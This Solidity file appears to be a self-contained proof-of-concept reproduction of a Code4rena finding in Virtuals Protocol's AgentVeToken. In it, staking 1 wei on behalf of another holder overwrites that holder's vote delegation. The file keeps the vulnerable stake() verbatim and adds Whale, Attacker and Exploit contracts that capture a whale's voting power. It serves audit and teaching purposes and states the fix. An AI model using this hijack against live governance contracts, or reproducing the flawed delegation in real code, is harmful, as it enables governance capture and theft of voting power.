// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Virtuals Protocol — Anybody can control a user's delegate by calling
    AgentVeToken.stake() with 1 wei   (Code4rena, finding #61823, H-02)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The vulnerable
    AgentVeToken.stake() body is inlined with the blamed line preserved VERBATIM
    (`_delegate(receiver, delegatee); // @audit-high ...`). The Exploit deploys
    everything, a whale stakes and self-delegates, then a 1-wei attacker hijacks
    the whale's voting-power delegation in one transaction (no fork, no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Virtuals Protocol — AgentVeToken.stake() delegate hijack
    Finding 61823 (Code4rena, natachi) — HIGH

    Root cause: AgentVeToken.stake(amount, receiver, delegatee) ends by calling
    `_delegate(receiver, delegatee)` UNCONDITIONALLY. The delegatee is chosen by
    whoever calls stake(), but the delegation is applied to `receiver`. Because
    anyone can stake tokens FOR an arbitrary receiver (only the caller's own LP
    balance is checked), an attacker can stake 1 wei of the LP asset token for a
    high-balance receiver and set an arbitrary delegatee — overwriting that
    receiver's chosen delegate and redirecting all of their veToken voting power.

    Since AgentVeToken shares are the voting power in the AgentDAO, an attacker
    can donate 1 wei to many high-balance holders, redirect their delegated votes
    to itself, obtain a governance majority, and push a malicious proposal.

    This file is a self-contained reduction. AgentVeToken is modeled as a minimal
    ERC20Votes-like token (balance + delegates + accumulated voting power). The
    vulnerable stake() body preserves the real require() checks, the asset-token
    pull, the _mint(receiver, amount), and the blamed `_delegate` line VERBATIM;
    the balance-checkpoint push is simplified out (it does not affect the bug).

    Recommended fix (from the report): remove the automatic `_delegate` call, or
    only perform it when `sender == receiver`.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 interface used by the veToken to pull the LP asset token.
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @dev Minimal LP asset token (the staking token). Standard ERC20 semantics.
contract MockLPToken is IERC20 {
    string public constant name = "Agent LP";
    string public constant symbol = "aLP";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced IAgentNft registry surface used by stake().
interface IAgentNft {
    function stakingTokenToVirtualId(address stakingToken) external view returns (uint256);
    function isBlacklisted(uint256 virtualId) external view returns (bool);
    function addValidator(uint256 virtualId, address validator) external;
}

/// @dev Minimal registry mock: addValidator is a no-op; the agent is never
///      blacklisted; a fixed virtualId is returned for the staking token.
contract MockAgentNft is IAgentNft {
    function stakingTokenToVirtualId(address) external pure returns (uint256) {
        return 1;
    }

    function isBlacklisted(uint256) external pure returns (bool) {
        return false;
    }

    function addValidator(uint256, address) external {}
}

/// @notice Reduced AgentVeToken — an ERC20Votes-like receipt/voting token minted
///         on stake(). Voting power follows delegation: when `account` delegates
///         to `delegatee`, `account`'s entire balance counts toward `delegatee`.
contract AgentVeToken {
    address public immutable assetToken; // the LP staking token
    address public immutable agentNft; // the registry
    bool public canStake; // public agents allow anyone to stake
    uint256 public initialLock;

    // ERC20Votes-like accounting
    mapping(address => uint256) public balanceOf; // veToken balance
    uint256 public totalSupply;
    mapping(address => address) public delegates; // account => chosen delegatee
    mapping(address => uint256) internal _votingPower; // delegatee => accumulated votes

    constructor(address _assetToken, address _agentNft, bool _canStake) {
        assetToken = _assetToken;
        agentNft = _agentNft;
        canStake = _canStake;
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    /// @notice Delegated voting power controlled by `account` (as a delegatee).
    function getVotes(address account) public view returns (uint256) {
        return _votingPower[account];
    }

    /// @dev Mint veToken; new units accrue to the holder's CURRENT delegate
    ///      (ERC20Votes semantics). If the holder has not delegated, no votes
    ///      move until _delegate is called.
    function _mint(address account, uint256 amount) internal {
        balanceOf[account] += amount;
        totalSupply += amount;
        address current = delegates[account];
        if (current != address(0)) {
            _votingPower[current] += amount;
        }
    }

    /// @dev Set `account`'s delegate and move `account`'s whole balance of
    ///      voting units from the old delegate to the new one.
    function _delegate(address account, address delegatee) internal {
        address old = delegates[account];
        uint256 bal = balanceOf[account];
        delegates[account] = delegatee;
        if (old != address(0)) {
            _votingPower[old] -= bal;
        }
        if (delegatee != address(0)) {
            _votingPower[delegatee] += bal;
        }
    }

    // ============================================================
    //  Vulnerable stake() — faithful reduction of
    //  contracts/virtualPersona/AgentVeToken.sol:L80 (Virtuals Protocol)
    // ============================================================
    function stake(uint256 amount, address receiver, address delegatee) public {
        require(canStake || totalSupply == 0, "Staking is disabled for private agent"); // Either public or first staker

        address sender = _msgSender();
        require(amount > 0, "Cannot stake 0");
        require(IERC20(assetToken).balanceOf(sender) >= amount, "Insufficient asset token balance");
        require(IERC20(assetToken).allowance(sender, address(this)) >= amount, "Insufficient asset token allowance");

        IAgentNft registry = IAgentNft(agentNft);
        uint256 virtualId = registry.stakingTokenToVirtualId(address(this));

        require(!registry.isBlacklisted(virtualId), "Agent Blacklisted");

        if (totalSupply == 0) {
            initialLock = amount;
        }

        registry.addValidator(virtualId, delegatee);

        IERC20(assetToken).transferFrom(sender, address(this), amount); // real: SafeERC20.safeTransferFrom (reduced)
        _mint(receiver, amount);
        // Recommended fix: only delegate on self-stake -> if (sender == receiver) { _delegate(receiver, delegatee); }
        _delegate(receiver, delegatee); // @audit-high Anybody can change delegate if they stake 1 wei LP // @> VULN
        // _balanceCheckpoints[receiver].push(clock(), SafeCast.toUint208(balanceOf(receiver))); // checkpoint (simplified out)
    }
}

/// @dev The victim: a whale who legitimately stakes a large amount and
///      self-delegates (so it controls its own voting power).
contract Whale {
    function honestStake(MockLPToken lp, AgentVeToken ve, uint256 amount) external {
        lp.approve(address(ve), amount);
        ve.stake(amount, address(this), address(this)); // self-stake, self-delegate
    }
}

/// @dev The attacker: owns just 1 wei of LP. It stakes that 1 wei FOR the whale
///      (receiver = whale) while naming ITSELF as the delegatee — hijacking the
///      whale's delegation with a 1-wei outlay.
contract Attacker {
    function hijack(MockLPToken lp, AgentVeToken ve, address whale) external {
        lp.approve(address(ve), 1);
        ve.stake(1, whale, address(this)); // receiver = whale (high balance), delegatee = attacker
    }
}

/// @dev Attacker orchestrator. Deploys the token/registry/veToken, funds a whale
///      and a 1-wei attacker, has the whale stake honestly, then hijacks the
///      whale's delegation — all cheatcode-free.
contract Exploit {
    uint256 public constant WHALE_STAKE = 1e18;

    MockLPToken public lp; // nonce 1
    MockAgentNft public registry; // nonce 2
    AgentVeToken public ve; // nonce 3
    Whale public whale; // nonce 4
    Attacker public attacker; // nonce 5
    address public deployer;

    constructor() {
        deployer = msg.sender;
        lp = new MockLPToken(); // CREATE nonce 1
        registry = new MockAgentNft(); // CREATE nonce 2
        ve = new AgentVeToken(address(lp), address(registry), true); // CREATE nonce 3 (public agent)
        whale = new Whale(); // CREATE nonce 4
        attacker = new Attacker(); // CREATE nonce 5

        // Fund: whale holds 1e18 LP; attacker holds only 1 wei LP.
        lp.mint(address(whale), WHALE_STAKE);
        lp.mint(address(attacker), 1);

        // Whale legitimately stakes and self-delegates (baseline governance state).
        whale.honestStake(lp, ve, WHALE_STAKE);
    }

    function run() external {
        // Baseline: the whale delegates its full voting power to itself.
        require(ve.delegates(address(whale)) == address(whale), "baseline delegate wrong");
        require(ve.getVotes(address(whale)) == WHALE_STAKE, "baseline votes wrong");
        require(ve.getVotes(address(attacker)) == 0, "attacker should start with 0 votes");

        // === attack: attacker stakes 1 wei FOR the whale, naming itself delegatee ===
        attacker.hijack(lp, ve, address(whale));

        // HARM: the whale's delegation is hijacked to the attacker, who now
        // controls the whale's entire voting power for a 1-wei outlay ->
        // governance capture.
        require(ve.delegates(address(whale)) == address(attacker), "delegate not hijacked");
        require(ve.getVotes(address(attacker)) >= WHALE_STAKE, "attacker did not capture whale votes");
        require(ve.getVotes(address(whale)) == 0, "whale still controls votes");
    }

    // convenience getters for the driver test
    function whaleAddr() external view returns (address) {
        return address(whale);
    }

    function attackerAddr() external view returns (address) {
        return address(attacker);
    }
}
